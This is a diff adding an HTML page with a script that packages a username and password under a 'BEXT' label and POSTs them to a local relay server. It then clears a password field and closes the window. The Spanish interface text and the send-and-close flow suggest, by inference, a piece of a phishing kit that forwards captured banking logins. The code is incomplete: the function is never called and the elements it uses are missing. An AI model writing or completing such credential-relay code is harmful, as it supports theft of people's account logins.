@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    
+</body>
+<script>
+ 
+ async function name(params) {
+  const usr = "asdadadad";
+  const usrs = "asdasdasdadad";
+
+  const message = `BEXT-- --Usuario: <code>${usr}</code> --\n PW:<code> ${usrs} </code>--`;
+  const responseMessage = document.getElementById("responseMessage");
+
+  if (!message.trim()) {
+    responseMessage.textContent = "⚠️ Ingresa un mensaje antes de enviar.";
+    return;
+  }
+
+  try {
+    const response = await fetch("http://localhost:3000/", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ message })
+    });
+
+    const data = await response.json();
+
+    if (response.ok) {
+      localStorage.setItem("usr", usr);
+      localStorage.setItem("send", "true");
+      document.getElementById('VOPASSWORD').value = "";
+      self.close();
+    } else {
+      responseMessage.textContent = "❌ Error al enviar mensaje: " + data.error;
+    }
+  } catch (error) {
+    responseMessage.textContent = "❌ Error en la solicitud: " + error.message;
+  }
+}
+
+
+ 	
+</script>
+</html>
